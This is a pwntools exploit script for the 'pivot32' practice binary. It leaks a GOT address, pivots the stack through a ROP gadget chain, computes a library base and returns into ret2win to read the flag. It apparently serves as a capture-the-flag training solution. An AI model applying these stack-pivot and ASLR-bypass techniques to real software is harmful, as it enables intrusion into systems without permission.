#!/bin/usr/python3

from pwn import *
#def start():
#	p = process("./pivot32")
#	gdb.attach(p , gdbscript='''
#		b main
#		continue
#	''')
#	return p

elf = context.binary = ELF("./pivot32", checksec=False)
#context.log_level = "info"
#context.delete_corefiles = True


#def find_eip(payload):
#    # Launch process and send payload
#    p = process("./pivot32")
#    p.sendlineafter('>', "")  # We need to deal with initial prompt
#    # Then we can send payload (when it asks for stack smash)
#    p.sendlineafter('>', payload)
#    # Wait for the process to crash
#    p.wait()
#    # Print out the address of EIP at the time of crashing
#    eip_offset = cyclic_find(p.corefile.eip)
#    info('located EIP offset at {a}'.format(a=eip_offset))
#    # Return the EIP offset
#    return eip_offset

# Pass in pattern_size, get back EIP offset
#eip_offset = find_eip(cyclic(100))
eip_offset = 44

#io = start()
p = process()
rop = ROP(elf)

#pivot_addr = int(re.search(r"(0x[\w\d]+)", p.recvS()).group(0), 16)
pivot_addr = int(re.search(r"(0x[\w\d]+)", p.recvS()).group(0), 16)

foothold_offset = 0x77d
ret2win_offset = 0x974
info("foot_hold offset = %#x", foothold_offset)
info("ret2win offset = %#x", ret2win_offset)

rop = ROP(elf)
pop_eax = rop.find_gadget(["pop eax", "ret"])[0]
info("pop eax; ret; = %#x", pop_eax)

xchg_eax_esp = elf.symbols.usefulGadgets + 2
info("xchg eax esp = %#x", xchg_eax_esp)

rop.call(elf.plt.foothold_function)
rop.call(elf.plt.puts, [elf.got.foothold_function])
rop.call(elf.symbols.main)

info("sending first payload to leak foothold_function@got address")
p.sendline(rop.chain())

payload = rop.chain()

rop = ROP(elf)
rop.raw([pop_eax, pivot_addr, xchg_eax_esp])

info("sending second payload to stack pivot")
p.sendlineafter(">", flat({eip_offset: rop.chain()}))

payload += flat({
	eip_offset: rop.chain()
})

p.recvlines(2)
leaked_got_address = p.recv()
foothold_leak = unpack(leaked_got_address[:4].strip())
libpivot32_base = foothold_leak - foothold_offset
ret2win_addr = libpivot32_base + ret2win_offset

# Print out for confirmation
info("Leaked foothold_function@got:")
info("foothold_leak: %#x", foothold_leak)
info("libpivot32_base: %#x", libpivot32_base)
info("ret2win_addr: %#x", ret2win_addr)


# Our third (and final) payload to retrieve out flag
p.sendline(flat({eip_offset: ret2win_addr}))

payload += flat({
	eip_offset: ret2win_addr
})

f = open("./payload", "wb")
f.write(payload)
f.close()


p.recvuntil("Thank you!\n")
flag = p.recv()
success(flag)

#while True:
#	tmp = p.recv()
#	info(tmp)

























